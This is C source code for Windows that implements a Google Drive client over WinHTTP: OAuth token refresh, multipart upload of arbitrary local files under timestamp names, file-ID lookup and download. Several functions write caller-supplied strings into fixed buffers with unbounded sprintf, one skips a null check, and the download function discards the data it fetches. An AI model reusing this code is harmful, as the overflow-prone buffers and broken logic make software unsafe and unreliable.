#include "pch.h"

BOOL RefreshAccessToken
(
	PDRIVE_CONFIG This
)
{
	CHAR szOauthPath[] = "https://oauth2.googleapis.com/token";
	CHAR lpBody[0x400];
	PHTTP_REQUEST pHttpRequest = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	HINTERNET hRequest = NULL;
	PBYTE pResp = NULL;
	DWORD cbResp = 0;
	BOOL Result = FALSE;
	LPSTR lpResult = NULL;
	DWORD dwStatusCode = 0;

	pHttpClient = HttpClientInit(UriInit(szOauthPath), This->HttpConfig.pProxyConfig);
	if (pHttpClient == NULL) {
		goto END;
	}

	SecureZeroMemory(lpBody, sizeof(lpBody));
	sprintf_s(lpBody, _countof(lpBody), "client_id=%s&client_secret=%s&refresh_token=%s&grant_type=refresh_token", This->lpClientId, This->lpClientSecret, This->lpRefreshToken);
	pHttpRequest = CreateHttpRequest(This, POST, 0, 0, 0, 0, GetContentTypeString(ApplicationXWwwFormUrlencoded), lpBody, lstrlenA(lpBody), FALSE, NULL);
	if (pHttpRequest == NULL) {
		goto END;
	}

	hRequest = SendRequest(pHttpClient, pHttpRequest, NULL, NULL, 0);
	if (hRequest == NULL) {
		goto END;
	}

	dwStatusCode = ReadStatusCode(hRequest);
	if (dwStatusCode == OK) {
		if (ReceiveData(hRequest, &pResp, &cbResp) && cbResp > 0) {
			lpResult = SearchMatchStrA(pResp, "access_token\": \"", "\",\n");
		}
		else {
			wprintf(L"ReceiveData failed at %lls. Error code: %d", __FUNCTIONW__, GetLastError());
			goto END;
		}
	}
	else {
		wprintf(L"Status code: %d\n", dwStatusCode);
		goto END;
	}

	This->lpAccessToken = lpResult;
	Result = TRUE;
END:
	if (pResp != NULL) {
		FREE(pResp);
	}

	if (hRequest != NULL) {
		WinHttpCloseHandle(hRequest);
	}

	FreeHttpRequest(pHttpRequest);
	FreeHttpClient(pHttpClient);

	return Result;
}

PDRIVE_CONFIG GoogleDriveInit
(
	_In_ LPSTR lpUserAgent,
	_In_ LPSTR lpClientId,
	_In_ LPSTR lpSecret,
	_In_ LPSTR lpRefreshToken
)
{
	LPSTR lpProxy = NULL;
	PDRIVE_CONFIG lpResult = NULL;
	PHTTP_REQUEST pHttpReq = NULL;

	lpProxy = GetProxyConfig();
	lpResult = ALLOC(sizeof(DRIVE_CONFIG));
	lpResult->lpClientId = lpClientId;
	lpResult->HttpConfig.lpUserAgent = lpUserAgent;
	lpResult->lpClientSecret = lpSecret;
	lpResult->lpRefreshToken = lpRefreshToken;
	if (lpProxy != NULL) {
		if (!lstrcmpA(lpProxy, "auto")) {
			lpResult->HttpConfig.pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
		}
		else {
			lpResult->HttpConfig.pProxyConfig = ProxyInit(UserProvided, lpProxy);
		}

		FREE(lpProxy);
	}

	return lpResult;
}

BOOL GoogleDriveUpload
(
	_In_ PDRIVE_CONFIG This,
	_In_ LPWSTR lpFilePath
)
{
	PBYTE pFileData = NULL;
	DWORD cbFileData = 0;
	BOOL Result = FALSE;
	CHAR szMetadata[0x400];
	CHAR szNewFileName[0x100];
	SYSTEMTIME SystemTime;
	LPSTR lpExtension = NULL;
	LPSTR lpBody = NULL;
	DWORD cbBody = 0;
	LPSTR lpUniqueBoundary = NULL;
	BOOL NoHeapMemory = FALSE;
	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
	PHTTP_RESP pResp = NULL;

	pFileData = ReadFromFile(lpFilePath, &cbFileData);
	if (pFileData == NULL || cbFileData == 0) {
		goto CLEANUP;
	}

	lpBody = ALLOC(cbFileData + 0x400);
	if (lpBody == NULL) {
		NoHeapMemory = TRUE;
		lpBody = VirtualAlloc(NULL, cbFileData + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (lpBody == NULL) {
			goto CLEANUP;
		}
	}

	ZeroMemory(&SystemTime, sizeof(SYSTEMTIME));
	GetSystemTime(&SystemTime);
	lpExtension = ConvertWcharToChar(PathFindExtensionW(lpFilePath));
	sprintf(szNewFileName, "%d-%d-%d-%d-%d-%d%s", SystemTime.wDay, SystemTime.wMonth, SystemTime.wYear, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond, lpExtension);
	sprintf(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szNewFileName);
	lpUniqueBoundary = GenRandomStr(16);
	cbBody = sprintf(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, szNewFileName);
	memcpy(&lpBody[cbBody], pFileData, cbFileData);
	cbBody += cbFileData;
	cbBody += sprintf(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
	sprintf(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
	pResp = SendHttpRequest(This, POST, szUrl, szContentType, lpBody, cbBody, TRUE, FALSE);
	if (pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FreeHttpResp(pResp);
	if (pFileData != NULL) {
		FREE(pFileData);
	}

	if (lpExtension != NULL) {
		FREE(lpExtension);
	}

	if (lpUniqueBoundary != NULL) {
		FREE(lpUniqueBoundary);
	}

	if (lpBody != NULL) {
		if (NoHeapMemory) {
			VirtualFree(lpBody, 0, MEM_RELEASE);
		}
		else {
			FREE(lpBody);
		}
	}

	return Result;
}

BOOL GetFileId
(
	_In_ PDRIVE_CONFIG This,
	_In_ LPSTR lpName,
	_Out_ LPSTR* pId
)
{
	CHAR szUrl[0x200] = "https://www.googleapis.com/drive/v3/files?q=mimeType%20=%20%27application/octet-stream%27%20and%20name%20=%20%27";
	DWORD cbResp = 0;
	BOOL bResult = FALSE;
	LPSTR lpResult = NULL;
	PHTTP_RESP pResp = NULL;

	sprintf(&szUrl[lstrlenA(szUrl)], "%s%%27&fields=files(id,mimeType,name,parents,createdTime)", lpName);
	pResp = SendHttpRequest(This, GET, szUrl, NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	lpResult = SearchMatchStrA(pResp->pRespData, "\"id\": \"", "\",\n");
	if (lpResult != NULL) {
		*pId = lpResult;
	}

	bResult = TRUE;
CLEANUP:
	FreeHttpResp(pResp);
	return bResult;
}

BOOL GoogleDriveDownload
(
	_In_ PDRIVE_CONFIG This,
	_In_ LPSTR lpFileId
)
{
	CHAR szUrl[0x80] = "https://www.googleapis.com/drive/v3/files/";
	PBYTE pFileData = NULL;
	DWORD dwFileSize = 0;
	BOOL bResult = FALSE;
	PHTTP_RESP pResp = NULL;

	sprintf(&szUrl[lstrlenA(szUrl)], "%s?alt=media", lpFileId);
	pResp = SendHttpRequest(This, GET, szUrl, NULL, NULL, 0, TRUE, FALSE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	bResult = TRUE;
CLEANUP:
	FreeHttpResp(pResp);
	return bResult;
}